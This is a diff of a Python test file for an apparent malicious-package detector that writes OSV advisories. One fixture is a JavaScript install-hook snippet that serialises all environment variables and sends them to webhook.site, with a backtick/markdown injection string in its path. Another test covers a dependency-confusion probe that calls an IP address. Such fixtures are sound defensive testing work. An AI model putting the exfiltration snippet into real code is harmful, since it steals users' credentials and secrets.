@@ -149,12 +149,13 @@ def test_package_must_be_new_and_unpopular():
 def test_report_quotes_code_and_cannot_be_injected():
     code = "const h=require('https');\nconst d=JSON.stringify(process.env);\nh.request({hostname:'webhook.site',path:'/x`[a](https://e.example)'}).end(d);\n"
     ev = _hook("node setup.js", code)
-    osv = auto.build_osv("demo-pkg", [ev], {"1.0.0": "2026-10-29T11:58:00Z"}, "spark, spark-open", NOW)
+    osv = auto.build_osv("demo-pkg", [ev], {"1.0.0": "2026-10-29T11:58:00Z"}, NOW)
     assert "id" not in osv and "summary" not in osv
     assert ev.sha256 in osv["details"] and "`JSON.stringify(process.env)`" in osv["details"]
     assert "published 2026-10-29 11:58 UTC" in osv["details"]
     assert osv["details"].count("`") % 2 == 0  # every code span is closed; quoted backticks were replaced
-    assert osv["database_specific"]["iocs"]["domains"] == ["webhook.site"]
+    assert osv["database_specific"]["iocs"]["domains"] == []  # a shared service; its URL stays
+    assert "references" not in osv and "Gatekeeper" not in osv["details"]
 
 
 def test_names():
@@ -179,7 +180,7 @@ def test_dependency_confusion_probe_is_proven_statically():
     ev = auto.install_evidence(_probe_pkg(PROBE), "1.0.0")
     assert ev is not None and ev.hosts == ["203.0.114.9"]
     assert any(f.note == "host" for f in ev.facts)
-    assert "the machine's identity" in auto.build_osv("p", [ev], {}, "Muse Spark", datetime(2026, 10, 30, tzinfo=timezone.utc))["details"]
+    assert "the machine's identity" in auto.build_osv("p", [ev], {}, datetime(2026, 10, 30, tzinfo=timezone.utc))["details"]
 
 
 def test_one_identity_call_is_not_a_probe():
